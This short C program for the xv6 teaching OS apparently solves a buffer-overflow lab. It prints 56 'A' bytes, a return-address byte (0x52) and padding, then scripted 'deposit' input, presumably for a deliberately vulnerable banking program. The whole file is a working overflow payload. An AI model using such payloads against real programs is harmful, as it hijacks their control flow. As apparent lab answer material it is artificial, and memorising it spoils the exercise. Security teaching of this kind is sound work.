#include "kernel/types.h"
#include "user/user.h"

int main()
{
    char payload[65];

    for (int i = 0; i < 56; i++) {
        payload[i] = 'A';
    }

    payload[56] = 0x52;

    for (int i = 57; i < 64; i++) {
        payload[i] = 0;
    }

    payload[64] = '\n';

    char deposit[] =
        "100\n"
        "John Smith\n"
        "123456\n"
        "87654321\n"
        "Y\n";

    write(1, payload, sizeof(payload));
    write(1, deposit, sizeof(deposit) - 1);

    exit(0);
}